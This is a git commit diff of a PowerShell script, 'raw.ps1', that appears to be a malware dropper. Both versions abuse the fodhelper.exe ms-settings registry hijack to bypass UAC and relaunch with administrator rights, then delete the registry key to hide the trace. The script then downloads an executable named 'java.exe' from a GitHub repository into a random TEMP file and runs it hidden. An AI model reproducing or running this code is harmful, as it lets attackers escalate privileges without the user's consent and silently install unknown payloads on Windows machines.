ca02869894a5148b63d5a08f65707092ef84afde
artla <129896279+3465h@users.noreply.github.com>
2026-04-08 19:05:39 +0300

    Update raw.ps1

--- raw.ps1
+++ raw.ps1
@@ -1,30 +1,21 @@
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $program = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -File `"$PSCommandPath`""
+    $registryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
 
-if (!$isAdmin) {
-    $userGroups = [Security.Principal.WindowsIdentity]::GetCurrent().Groups
-    $adminSid = New-Object Security.Principal.SecurityIdentifier("S-1-5-32-544")
-    $canElevate = $userGroups -contains $adminSid
+    if (!(Test-Path $registryPath)) { New-Item $registryPath -Force | Out-Null }
 
-    if ($canElevate) {
-        $program = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -File `"$PSCommandPath`""
-        $registryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
-        if (!(Test-Path $registryPath)) { New-Item $registryPath -Force | Out-Null }
-        New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
-        Set-ItemProperty -Path $registryPath -Name "(default)" -Value $program -Force | Out-Null
-        
-        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-        Start-Sleep 1.5
-        Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
-        exit
-    }
-}
+    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
+    Set-ItemProperty -Path $registryPath -Name "(default)" -Value $program -Force | Out-Null
 
-try {
-    $url = "https://github.com/3465h/idkkkk/raw/refs/heads/main/java.exe"
-    $file = "$env:TEMP\$([guid]::NewGuid()).exe"
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+    Start-Sleep 1.5
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 
-    Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing -ErrorAction Stop;
-    Start-Process -FilePath $file -WindowStyle Hidden -Wait;
-} catch {
     exit
 }
+
+$url = "https://github.com/3465h/idkkkk/raw/refs/heads/main/java.exe"
+$file = "$env:TEMP\$([guid]::NewGuid()).exe"
+
+Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing -ErrorAction Stop;
+Start-Process -FilePath $file -WindowStyle Hidden -Wait;
